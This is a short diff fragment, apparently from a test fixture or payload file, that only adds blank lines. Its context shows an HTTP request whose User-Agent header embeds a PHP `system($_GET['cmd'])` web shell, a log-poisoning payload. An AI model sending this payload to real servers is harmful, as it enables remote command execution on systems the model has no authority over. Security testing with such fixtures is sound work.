@@ -6,3 +6,5 @@
 	GET / HTTP/1.1
 	User-Agent: aa<?php echo system($_GET['cmd']); ?>bb
 
+
+
